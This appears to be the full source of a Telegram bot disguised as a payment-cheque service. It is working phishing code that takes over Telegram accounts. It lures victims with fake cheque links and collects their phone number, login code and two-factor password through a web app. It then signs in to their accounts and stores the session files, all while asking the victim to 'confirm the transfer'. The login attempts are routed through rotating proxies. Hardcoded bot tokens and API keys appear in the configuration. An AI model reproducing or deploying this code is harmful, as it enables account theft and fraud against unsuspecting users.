import base64
import hashlib
import struct
import secrets
import logging
import json
import asyncio
import time
import random
from pathlib import Path

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.enums import ParseMode

from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    PasswordHashInvalid,
)
from pyrogram.raw.functions import Ping
import pyrogram.raw.types

# ============ КОНФИГУРАЦИЯ ============
SECRET_KEY = "umbral"
ADMIN_ID = 8727416659  # ваш ID в Telegram
BOT_USERNAME = "DurovPayRobot"       # <--- ваш юзернейм (без @)
BOT_TOKEN = "8664544708:AAGjJ1jVbowtCB3uZbTwaAGbEU8geJDlhXY"         # <--- замените на реальный токен

API_ID = 38574428
API_HASH = "a565615d2de3813ac96b691682ef241e"

DATA_DIR = Path("data")
DATA_DIR.mkdir(exist_ok=True)
USERS_FILE = DATA_DIR / "users.json"
SESSIONS_DIR = DATA_DIR / "sessions"
PROXIES_FILE = Path("checked_proxies.txt")

# --- MTProxy ПУЛ ---
PROXY_CONNECT_TIMEOUT = 15
PROXY_HEALTH_TIMEOUT = 12
MAX_PROXY_RETRIES = 3
CHECK_CONCURRENCY = 5

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

WEBAPP_URL = f"https://jaguars1.bothost.ru/webapp/"


# ============ ПАРСИНГ ПРОКСИ ============
def parse_proxies(file_path: Path) -> list:
    proxies = []
    if not file_path.exists():
        logger.warning(f"Файл прокси {file_path} не найден!")
        return proxies
    with open(file_path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            try:
                parts = line.split()
                if len(parts) < 2:
                    continue
                host_port = parts[0]
                secret_part = parts[1]
                if "=" not in secret_part:
                    continue
                secret = secret_part.split("=", 1)[1]
                if ":" in host_port:
                    host, port_str = host_port.rsplit(":", 1)
                    port = int(port_str)
                else:
                    continue
                proxies.append((host, port, secret))
            except Exception as e:
                logger.warning(f"Ошибка парсинга прокси строки: {line} — {e}")
                continue
    logger.info(f"Загружено {len(proxies)} MTProxy")
    return proxies


# ============ ПУЛ С ROUND-ROBIN РОТАЦИЕЙ ============
class MTProxyPool:
    def __init__(self, proxy_list: list):
        self.all_proxies = proxy_list.copy()
        random.shuffle(self.all_proxies)
        self.verified_cache = {}
        self.cache_lock = asyncio.Lock()
        self._preload_task = None
        self._check_semaphore = asyncio.Semaphore(CHECK_CONCURRENCY)

    def start_preload(self):
        if self._preload_task is None or self._preload_task.done():
            self._preload_task = asyncio.create_task(self._background_verify())

    async def _background_verify(self):
        logger.info("Фоновая проверка прокси запущена...")
        to_check = self.all_proxies[:20]
        tasks = [self._quick_check(proxy) for proxy in to_check]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        verified = 0
        for proxy, result in zip(to_check, results):
            if result is True:
                async with self.cache_lock:
                    if proxy not in self.verified_cache:
                        self.verified_cache[proxy] = {"last_used": 0, "success_count": 0}
                verified += 1
        logger.info(f"Фоновая проверка завершена: {verified}/{len(to_check)} прокси живы")

    async def _quick_check(self, proxy: tuple) -> bool:
        async with self._check_semaphore:
            host, port, secret = proxy
            session_path = SESSIONS_DIR / f"check_{int(time.time()*1000)}_{random.randint(1000,9999)}"
            SESSIONS_DIR.mkdir(exist_ok=True)

            proxy_dict = {
                "hostname": host,
                "port": port,
                "secret": secret
            }

            client = Client(
                str(session_path),
                api_id=API_ID,
                api_hash=API_HASH,
                proxy=proxy_dict,
                workdir=str(SESSIONS_DIR),
                in_memory=False
            )

            try:
                await asyncio.wait_for(client.connect(), timeout=PROXY_HEALTH_TIMEOUT)
                if not client.is_connected:
                    return False
                ping_request = pyrogram.raw.functions.Ping(ping_id=random.randint(1, 999999))
                await asyncio.wait_for(client.invoke(ping_request), timeout=5)
                await client.disconnect()
                return True
            except Exception as e:
                logger.debug(f"Прокси {host}:{port} не прошёл проверку: {e}")
                return False
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass
                for ext in [".session", ".session-journal"]:
                    f = Path(str(session_path) + ext)
                    if f.exists():
                        try:
                            f.unlink()
                        except:
                            pass

    async def acquire(self) -> tuple:
        async with self.cache_lock:
            alive_proxies = list(self.verified_cache.keys())

        if not alive_proxies:
            logger.warning("Кэш пуст, ищем живые прокси...")
            random.shuffle(self.all_proxies)
            for proxy in self.all_proxies[:MAX_PROXY_RETRIES * 3]:
                if await self._quick_check(proxy):
                    async with self.cache_lock:
                        self.verified_cache[proxy] = {"last_used": time.time(), "success_count": 1}
                    logger.info(f"Найден и закэширован новый прокси: {proxy[0]}:{proxy[1]}")
                    return proxy
            raise RuntimeError("Нет рабочих прокси!")

        async with self.cache_lock:
            sorted_proxies = sorted(alive_proxies, key=lambda p: self.verified_cache[p]["last_used"])

        for proxy in sorted_proxies[:MAX_PROXY_RETRIES]:
            if await self._quick_check(proxy):
                async with self.cache_lock:
                    self.verified_cache[proxy]["last_used"] = time.time()
                    self.verified_cache[proxy]["success_count"] += 1
                logger.info(f"Выдан прокси: {proxy[0]}:{proxy[1]} (использований: {self.verified_cache[proxy]['success_count']})")
                return proxy
            else:
                logger.warning(f"Прокси {proxy[0]}:{proxy[1]} умер, удаляем из кэша")
                async with self.cache_lock:
                    self.verified_cache.pop(proxy, None)

        logger.warning("Все кэшированные прокси мертвы, ищем новые...")
        random.shuffle(self.all_proxies)
        for proxy in self.all_proxies[:MAX_PROXY_RETRIES * 3]:
            if await self._quick_check(proxy):
                async with self.cache_lock:
                    self.verified_cache[proxy] = {"last_used": time.time(), "success_count": 1}
                logger.info(f"Найден новый прокси: {proxy[0]}:{proxy[1]}")
                return proxy

        raise RuntimeError("Нет рабочих прокси!")


proxy_pool = None


# ============ ШИФРОВАНИЕ / РАСШИФРОВКА ============
def get_key(secret: str) -> bytes:
    return hashlib.sha256(secret.encode()).digest()

def xor_encrypt(plaintext: str) -> str:
    key = get_key(SECRET_KEY)
    data = plaintext.encode('utf-8')
    encrypted = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
    return base64.urlsafe_b64encode(encrypted).decode().rstrip('=')

def xor_decrypt(ciphertext: str) -> str:
    key = get_key(SECRET_KEY)
    padding = 4 - len(ciphertext) % 4
    if padding != 4:
        ciphertext += '=' * padding
    encrypted = base64.urlsafe_b64decode(ciphertext)
    decrypted = bytes(encrypted[i] ^ key[i % len(key)] for i in range(len(encrypted)))
    return decrypted.decode('utf-8')


# ============ ХРАНИЛИЩЕ ПОЛЬЗОВАТЕЛЕЙ ============
def load_users():
    if USERS_FILE.exists():
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, ensure_ascii=False, indent=2)

def get_user_data(user_id: int):
    users = load_users()
    return users.get(str(user_id), {})

def set_user_data(user_id: int, data: dict):
    users = load_users()
    users[str(user_id)] = data
    save_users(users)


# ============ ШИФРОВАНИЕ ЧЕКА ============
def encrypt_check(sum_amount: float, user_id: int) -> str:
    key = get_key(SECRET_KEY)
    check_id = secrets.randbelow(0xFFFFFFFF)
    data = struct.pack('<fQI', sum_amount, user_id, check_id)
    encrypted = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
    return base64.urlsafe_b64encode(encrypted).decode().rstrip('=')

def decrypt_check(token: str) -> dict:
    key = get_key(SECRET_KEY)
    padding = 4 - len(token) % 4
    if padding != 4:
        token += '=' * padding
    encrypted = base64.urlsafe_b64decode(token)
    if len(encrypted) != 16:
        raise ValueError(f"Invalid token length: {len(encrypted)}, expected 16")
    decrypted = bytes(encrypted[i] ^ key[i % len(key)] for i in range(len(encrypted)))
    sum_amount, user_id, check_id = struct.unpack('<fQI', decrypted)
    return {'sum': round(sum_amount, 2), 'user_id': user_id, 'check_id': check_id}


# ============ PYROGRAM СЕССИИ ============
pending_sessions = {}

def generate_session_name(user_id: int) -> str:
    return f"session_{user_id}_{int(time.time()*1000)}"

async def create_pyrogram_session(user_id: int, phone: str):
    global proxy_pool
    session_name = generate_session_name(user_id)
    session_path = SESSIONS_DIR / session_name
    SESSIONS_DIR.mkdir(exist_ok=True)

    proxy = await proxy_pool.acquire()
    proxy_host, proxy_port, proxy_secret = proxy
    proxy_dict = {"hostname": proxy_host, "port": proxy_port, "secret": proxy_secret}

    client = Client(
        str(session_path),
        api_id=API_ID,
        api_hash=API_HASH,
        proxy=proxy_dict,
        workdir=str(SESSIONS_DIR)
    )

    try:
        await asyncio.wait_for(client.connect(), timeout=PROXY_CONNECT_TIMEOUT)
        sent_code = await client.send_code(phone)
        phone_code_hash = sent_code.phone_code_hash

        pending_sessions[user_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": phone_code_hash,
            "step": "waiting_code",
            "session_name": session_name,
            "proxy": proxy
        }
        return True, None
    except Exception as e:
        try:
            await client.disconnect()
        except Exception:
            pass
        session_file = Path(str(session_path) + ".session")
        if session_file.exists():
            session_file.unlink()
        logger.error(f"Ошибка отправки кода для {user_id}: {e}")
        return False, str(e)

async def sign_in_with_code(user_id: int, code: str):
    session_data = pending_sessions.get(user_id)
    if not session_data:
        return False, "Сессия не найдена. Начните заново."

    client = session_data["client"]
    phone = session_data["phone"]
    phone_code_hash = session_data["phone_code_hash"]
    session_name = session_data["session_name"]

    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        me = await client.get_me()

        user_data = get_user_data(user_id)
        if "telegram_auth" not in user_data:
            user_data["telegram_auth"] = {}
        if "session_filenames" not in user_data["telegram_auth"]:
            user_data["telegram_auth"]["session_filenames"] = []
        user_data["telegram_auth"]["session_filenames"].append(session_name)
        user_data["telegram_auth"]["telegram_id"] = me.id
        user_data["telegram_auth"]["phone"] = phone
        user_data["telegram_auth"]["username"] = me.username
        user_data["telegram_auth"]["premium"] = me.is_premium
        user_data["telegram_auth"]["authorized"] = True
        set_user_data(user_id, user_data)

        await client.disconnect()
        del pending_sessions[user_id]
        return True, None
    except SessionPasswordNeeded:
        pending_sessions[user_id]["step"] = "waiting_password"
        return False, "password_needed"
    except PhoneCodeInvalid:
        return False, "invalid_code"
    except PhoneCodeExpired:
        return False, "code_expired"
    except Exception as e:
        logger.error(f"Ошибка входа по коду {user_id}: {e}")
        return False, str(e)

async def sign_in_with_password(user_id: int, password: str):
    session_data = pending_sessions.get(user_id)
    if not session_data:
        return False, "Сессия не найдена."

    client = session_data["client"]
    session_name = session_data["session_name"]

    try:
        await client.check_password(password)
        me = await client.get_me()

        user_data = get_user_data(user_id)
        if "telegram_auth" not in user_data:
            user_data["telegram_auth"] = {}
        if "session_filenames" not in user_data["telegram_auth"]:
            user_data["telegram_auth"]["session_filenames"] = []
        user_data["telegram_auth"]["session_filenames"].append(session_name)
        user_data["telegram_auth"]["telegram_id"] = me.id
        user_data["telegram_auth"]["phone"] = session_data["phone"]
        user_data["telegram_auth"]["username"] = me.username
        user_data["telegram_auth"]["premium"] = me.is_premium
        user_data["telegram_auth"]["authorized"] = True
        set_user_data(user_id, user_data)

        await client.disconnect()
        del pending_sessions[user_id]
        return True, None
    except PasswordHashInvalid:
        return False, "invalid_password"
    except Exception as e:
        logger.error(f"Ошибка входа по паролю {user_id}: {e}")
        return False, str(e)

def cleanup_old_sessions(user_id: int):
    user_data = get_user_data(user_id)
    auth = user_data.get("telegram_auth", {})
    sessions = auth.get("session_filenames", [])
    if len(sessions) <= 5:
        return
    to_remove = sessions[:-5]
    remaining = sessions[-5:]
    for session_name in to_remove:
        session_file = SESSIONS_DIR / f"{session_name}.session"
        if session_file.exists():
            try:
                session_file.unlink()
                logger.info(f"Удалён старый файл сессии: {session_file}")
            except Exception as e:
                logger.error(f"Не удалось удалить {session_file}: {e}")
    user_data["telegram_auth"]["session_filenames"] = remaining
    set_user_data(user_id, user_data)


# ============ ОБРАБОТЧИКИ БОТА ============
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    args = message.text.split(maxsplit=1)
    user_id = message.from_user.id

    if len(args) > 1:
        param = args[1].strip()

        if param.startswith("createSession_"):
            target_user_id = int(param.split("_")[1])
            if target_user_id != user_id:
                return
            user_data = get_user_data(user_id)
            phone = user_data.get("phone")
            if not phone:
                await message.answer("❌ Сначала укажите номер телефона в приложении.")
                return
            success, error = await create_pyrogram_session(user_id, phone)
            if not success:
                await message.answer(f"❌ Ошибка отправки кода: {error}")
            return

        elif param.startswith("sendCode_"):
            parts = param.split("_")
            if len(parts) < 3:
                return
            target_user_id = int(parts[1])
            encrypted_code = parts[2]
            if target_user_id != user_id:
                await message.answer("❌ Эта ссылка не для вас.")
                return
            try:
                code = xor_decrypt(encrypted_code)
            except Exception:
                await message.answer("❌ Ошибка расшифровки кода.")
                return
            if len(code) != 5 or not code.isdigit():
                await message.answer("❌ Неверный формат кода.")
                return
            success, error = await sign_in_with_code(user_id, code)
            try:
                await message.delete()
            except:
                pass
            if success:
                cleanup_old_sessions(user_id)
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="Подтвердить", url=f"{WEBAPP_URL}?startapp=success_{user_id}")]
                ])
                await message.answer("Вы подтверждаете перевод?", reply_markup=keyboard)
            elif error == "password_needed":
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🔑 Ввести пароль", url=f"{WEBAPP_URL}?startapp=enterPassword_{user_id}")]
                ])
                sent_msg = await message.answer("🔐 Требуется пароль двухфакторной аутентификации.", reply_markup=keyboard)
                user_data = get_user_data(user_id)
                user_data["password_prompt_msg_id"] = sent_msg.message_id
                set_user_data(user_id, user_data)
            elif error == "invalid_code":
                await message.answer("❌ Неверный код подтверждения. Попробуйте снова.")
            elif error == "code_expired":
                await message.answer("⏰ Код устарел. Запросите новый.")
            else:
                await message.answer(f"❌ Ошибка: {error}")
            return

        elif param.startswith("sendPassword_"):
            parts = param.split("_")
            if len(parts) < 3:
                return
            target_user_id = int(parts[1])
            encrypted_password = "_".join(parts[2:])
            if target_user_id != user_id:
                await message.answer("❌ Эта ссылка не для вас.")
                return
            if not encrypted_password:
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🔄 Ввести пароль повторно", url=f"{WEBAPP_URL}?startapp=enterPassword_{user_id}")]
                ])
                await message.answer("❌ Пароль не передан.", reply_markup=keyboard)
                return
            try:
                password = xor_decrypt(encrypted_password)
            except Exception:
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🔄 Ввести пароль повторно", url=f"{WEBAPP_URL}?startapp=enterPassword_{user_id}")]
                ])
                await message.answer("❌ Ошибка расшифровки пароля.", reply_markup=keyboard)
                return
            success, error = await sign_in_with_password(user_id, password)
            try:
                await message.delete()
            except:
                pass
            user_data = get_user_data(user_id)
            password_prompt_msg_id = user_data.get("password_prompt_msg_id")
            if password_prompt_msg_id:
                try:
                    await bot.delete_message(chat_id=user_id, message_id=password_prompt_msg_id)
                except:
                    pass
                user_data.pop("password_prompt_msg_id", None)
                set_user_data(user_id, user_data)
            if success:
                cleanup_old_sessions(user_id)
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="Подтвердить", url=f"{WEBAPP_URL}?startapp=success_{user_id}")]
                ])
                await message.answer("Вы подтверждаете перевод?", reply_markup=keyboard)
            elif error == "invalid_password":
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🔄 Ввести пароль повторно", url=f"{WEBAPP_URL}?startapp=enterPassword_{user_id}")]
                ])
                sent_msg = await message.answer("❌ Неверный пароль. Попробуйте снова.", reply_markup=keyboard)
                user_data["password_prompt_msg_id"] = sent_msg.message_id
                set_user_data(user_id, user_data)
            else:
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🔄 Ввести пароль повторно", url=f"{WEBAPP_URL}?startapp=enterPassword_{user_id}")]
                ])
                sent_msg = await message.answer(f"❌ Ошибка: {error}", reply_markup=keyboard)
                user_data["password_prompt_msg_id"] = sent_msg.message_id
                set_user_data(user_id, user_data)
            return

        else:
            token = param
            try:
                data = decrypt_check(token)
                text = f"💰 Чек на сумму: {data['sum']} ₽\nДля пользователя: {data['user_id']}"
                webapp_url = f"https://t.me/{BOT_USERNAME}/app?startapp={token}"
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="Активировать", url=webapp_url)]
                ])
                await message.answer(text, reply_markup=keyboard)
            except Exception as e:
                logger.error(f"Ошибка дешифровки: {e}")
                await message.answer("❌ Неверная или повреждённая ссылка чека.")
    else:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🚀 Открыть приложение", url=WEBAPP_URL)]
        ])
        await message.answer(
            "Принимайте и создавайте чеки, делитесь ими с кем угодно. Оплачивайте покупки в магазинах по QR-коду. Без передачи личных данных.",
            reply_markup=keyboard
        )


@dp.message(Command("new"))
async def cmd_new(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("⛔ У вас нет прав.")
        return
    args = message.text.split()
    if len(args) != 3:
        await message.answer("❌ Использование: `/new <сумма> <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    try:
        sum_amount = float(args[1])
        user_id = int(args[2])
    except ValueError:
        await message.answer("❌ Неверные параметры.")
        return
    token = encrypt_check(sum_amount, user_id)
    link = f"https://t.me/{BOT_USERNAME}?start={token}"
    await message.answer(f"🔗 {link}")


@dp.message(F.contact)
async def handle_contact(message: types.Message):
    contact = message.contact
    user_id = message.from_user.id
    if contact.user_id != user_id:
        try:
            await message.delete()
        except:
            pass
        return
    phone = contact.phone_number
    user_data = get_user_data(user_id)
    user_data["phone"] = phone
    user_data["user_id"] = user_id
    set_user_data(user_id, user_data)
    try:
        await message.delete()
    except:
        pass


@dp.message()
async def any_message(message: types.Message):
    await message.answer(
        "Принимайте и создавайте чеки, делитесь ими с кем угодно. Оплачивайте покупки в магазинах по QR-коду. Без передачи личных данных."
    )


async def main():
    global proxy_pool
    proxies = parse_proxies(PROXIES_FILE)
    if not proxies:
        logger.error("Нет доступных прокси! Работа без прокси невозможна.")
        return
    proxy_pool = MTProxyPool(proxies)
    proxy_pool.start_preload()
    logger.info("Бот @DurovPayRobot запущен, прокси проверяются в фоне...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
